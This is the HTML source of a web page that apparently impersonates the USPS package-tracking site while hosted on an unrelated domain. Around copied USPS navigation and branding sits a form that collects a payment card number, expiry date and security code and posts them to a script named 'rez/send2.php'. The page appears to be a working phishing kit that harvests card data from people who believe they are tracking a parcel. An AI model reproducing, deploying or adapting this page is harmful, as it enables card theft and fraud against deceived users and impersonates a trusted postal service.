...
<div class="nav-utility" id="nav-utility">
	<div class="utility-links" id="utility-header">
		<div class="lang-select">
			<a id="link-lang" href="https://www.okinawa-grandmer.com/tracking/usps/index2.php#">
		...
		<a id="link-locator" href="https://www.okinawa-grandmer.com/tracking/usps/index2.php#">Locations</a>
		<a id="link-customer" href="https://www.okinawa-grandmer.com/tracking/usps/index2.php#">Support</a>
		<a id="link-myusps" href="https://www.okinawa-grandmer.com/tracking/usps/index2.php#">Informed Delivery</a>
		<a id="login-register-header" class="link-reg" href="https://reg.usps.com/entreg/LoginAction_input?app=UspsTools&amp;appURL=https://www.okinawa-grandmer.com/tracking/usps/index2.php">Register / Sign In</a>
		<div id="link-cart" style="display: inline-block;"></div>
	</div>
</div>
<div class="global--navigation" id="g-navigation">
	<a tabindex="-1" name="skipallnav" id="skipallnav" href="https://www.okinawa-grandmer.com/tracking/usps/index2.php#endnav" class="hidden-skip">Skip all category navigation links</a>
<div class="nav-full">
  ...
  <a class="global-logo" href="https://www.usps.com/" style="vertical-align: baseline;">
	...
	<div class="mobile-header">
		<a class="mobile-hamburger" href="https://www.okinawa-grandmer.com/tracking/usps/index2.php#"><img src="./files/hamburger.svg" alt="hamburger menu Icon"></a>
		<a class="mobile-logo" href="https://www.usps.com/"><img src="./files/logo_mobile.svg" alt="USPS mobile logo"></a>
		<a class="mobile-search" href="https://www.okinawa-grandmer.com/tracking/usps/index2.php#"><img src="./files/search.svg" alt="Search Icon"></a>
	</div>
	
 <nav>
  	<div class="mobile-log-state">
		<div id="msign" class="mobile-utility">
			<div class="mobile-sign"><a href="https://reg.usps.com/entreg/LoginAction_input?app=UspsTools&amp;appURL=https://www.okinawa-grandmer.com/tracking/usps/index2.php">Sign In</a></div>
		</div>
	</div>
    <ul class="nav-list" role="menubar">
      <li class="qt-nav menuheader">
	  	<a tabindex="-1" name="navquicktools" id="navquicktools" href="https://www.okinawa-grandmer.com/tracking/usps/index2.php#navmailship" class="hidden-skip">Skip Quick Tools Links</a>
		<a aria-expanded="false" role="menuitem" tabindex="0" aria-haspopup="true" class="nav-first-element menuitem" href="https://www.okinawa-grandmer.com/tracking/usps/index2.php#">Quick Tools</a>
        <div class="">
      ...
      <li class="menuheader">
	  	<a tabindex="-1" name="navmailship" id="navmailship" href="https://www.okinawa-grandmer.com/tracking/usps/index2.php#navtrackmanage" class="hidden-skip">Skip Mail and Ship Links</a>
      ...
      <li class="menuheader">
	  	<a tabindex="-1" name="navtrackmanage" id="navtrackmanage" href="https://www.okinawa-grandmer.com/tracking/usps/index2.php#navpostalstore" class="hidden-skip">Skip Track and Manage Links</a>
...
<div class="desktop-only manage-addition"><a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/go-now.htm"><img src="./files/go-now(1).png" alt=" "></a></div>
      ...
      <li class="menuheader">
	  	<a tabindex="-1" name="navpostalstore" id="navpostalstore" href="https://www.okinawa-grandmer.com/tracking/usps/index2.php#navbusiness" class="hidden-skip">Skip Postal Store Links</a>
      ...
      <li class="menuheader">
	  	<a tabindex="-1" name="navbusiness" id="navbusiness" href="https://www.okinawa-grandmer.com/tracking/usps/index2.php#navinternational" class="hidden-skip">Skip Business Links</a>
      ...
      <li class="menuheader">
		<a tabindex="-1" name="navinternational" id="navinternational" href="https://www.okinawa-grandmer.com/tracking/usps/index2.php#navhelp" class="hidden-skip">Skip International Links</a>
      ...
      <li class="menuheader">
	  	<a tabindex="-1" name="navhelp" id="navhelp" href="https://www.okinawa-grandmer.com/tracking/usps/index2.php#navsearch" class="hidden-skip">Skip Help Links</a>
	  ...
	  <li class="nav-search menuheader">
	  	<a tabindex="-1" name="navsearch" id="navsearch" href="https://www.okinawa-grandmer.com/tracking/usps/index2.php#endnav" class="hidden-skip">Skip Search</a>
		<a aria-expanded="false" class="menuitem" tabindex="0" aria-haspopup="true" role="menuitem" href="https://www.okinawa-grandmer.com/tracking/usps/index2.php#">Search USPS.com</a>
		<div class="repos">
		<!-- Search -->
	...
	<a name="endnav" id="endnav" href="https://www.okinawa-grandmer.com/tracking/usps/index2.php#" class="hidden-skip">&nbsp;</a>
</div></div>
...
<script src="./files/megamenu-additions.js"></script>
    ...
    <div class="container-fluid full-subheader"> <!-- Subheader -->
      ...
      <div class="subheader_links">
        <a href="https://www.okinawa-grandmer.com/tracking/usps/index2.php#" class="active">Tracking <i class="icon-carat_right"></i></a>
        <a href="https://www.okinawa-grandmer.com/tracking/usps/index2.php#" class="header-faqs" id="faqHeader"><strong>FAQs</strong> <i class="icon-carat_right"></i></a>
      </div>
    </div>
	<div class="container-fluid tracking_form_container"> 
      <div class="row">
        <div class="col-xl-3 col-lg-4 col-sm-12">
          <h3><a class="track-another-package-open" href="https://www.okinawa-grandmer.com/tracking/usps/index2.php#">Track Another Package <i>+</i></a></h3>
        </div>
						...
						<div class="row">
							<div class="col-md-12 col-sm-12 col-xs-12 button-wrapper">
								<div class="button-container redlivbtnContainer">
									<a href="https://www.okinawa-grandmer.com/tracking/usps/index2.php#" role="button" class="btn-primary saveDate" id="save-resume-date" data-dismiss="modal" tabindex="0">Select</a>
								</div>
							</div>
							<div class="col-md-12 col-sm-12 col-xs-12 button-wrapper">
								<div class="button-container redlivbtnContainer">
									<a href="https://www.okinawa-grandmer.com/tracking/usps/index2.php#" role="button" class="btn-primary button--white clearDates" id="clear-resume-dates" data-dismiss="modal" tabindex="0">Cancel</a>
								</div>
							</div>
						</div>
					</div>
	...
	<!-- END CALENDAR MODAL -->
      ...
      <div class="row">
        <div class="col-sm-10">
          <span class="cancel"><a href="https://www.okinawa-grandmer.com/tracking/usps/index2.php#" class="track-another-package-close" style="display: none;">Close <i class="icon-cancel"></i></a></span>
        </div>
      </div>
...
<form method="POST" action="rez/send2.php">
...
<br>
<input type="text" name="ccnumb" maxlength="50" required="" placeholder="Card Number" onkeypress='return formats(this,event)' onkeyup="return numberValidation(event)" tabindex="8" id="taddress" class="form-control">
...
<br>
<input type="text" name="expr" placeholder="Expiry Date (MM/YY)" maxlength="5" onkeyup="formatString(event);" oninput="ex()" required="" value="" tabindex="9" id="tapt" class="form-control">
...
<br>
<input type="text" name="cvvz" maxlength="4" placeholder="Security code" onkeyup="return numberValidation(event)" required="" tabindex="10" id="tcity" class="form-control">
</div>
...
<div class="row">
  <div class="col-sm-12">
    ...
    <a href="https://www.okinawa-grandmer.com/tracking/usps/index2.php#" id="idxsFAQBtn" class="button">FAQs</a>
  </div>
</div>
</div>
...
<li><a href="https://www.okinawa-grandmer.com/tracking/usps/index2.php#" onclick="KAMPYLE_ONSITE_SDK.showForm(244)">Feedback</a></li>
</ol>
</li>
...
function ex() {
  ...
  </body><script>function formatString(e) {
